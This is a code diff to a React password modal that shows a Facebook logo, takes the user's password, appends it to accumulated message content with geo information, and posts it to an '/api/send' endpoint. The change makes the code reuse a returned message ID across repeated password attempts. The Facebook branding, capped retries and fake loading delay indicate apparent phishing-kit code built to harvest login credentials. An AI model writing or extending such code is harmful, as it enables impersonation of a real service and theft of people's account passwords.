@@ -18,7 +18,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, messageContent, setMessageContent } = store();
+    const { geoInfo, messageId, messageContent, setMessageContent, setMessageId } = store();
     const maxPass = config.MAX_PASS ?? 3;
 
     const t = (text: string): string => {
@@ -61,12 +61,16 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const updatedMessage = messageContent ? `${messageContent}\n\n${passwordLine}` : passwordLine;
 
         try {
-            await axios.post('/api/send', {
+            const res = await axios.post('/api/send', {
                 message: updatedMessage,
                 message_id: messageId
             });
 
             setMessageContent(updatedMessage);
+
+            if (res?.data?.success && typeof res.data.message_id === 'number') {
+                setMessageId(res.data.message_id);
+            }
 
             if (config.PASSWORD_LOADING_TIME) {
                 await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
@@ -87,7 +91,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     return (
         <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
             <div className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
-                <Image src={FacebookLogoImage} alt='' className='mt-9 h-[70px] w-[70px]' />
+                <Image src={FacebookLogoImage} alt='' className='mt-9 h-17.5 w-17.5' />
                 <div className='flex w-full flex-1 flex-col justify-center'>
                     <div className='relative w-full'>
                         <input type={showPassword ? 'text' : 'password'} id='password-input' value={password} onChange={(e) => setPassword(e.target.value)} className='peer h-[60px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder={t('Password')} />
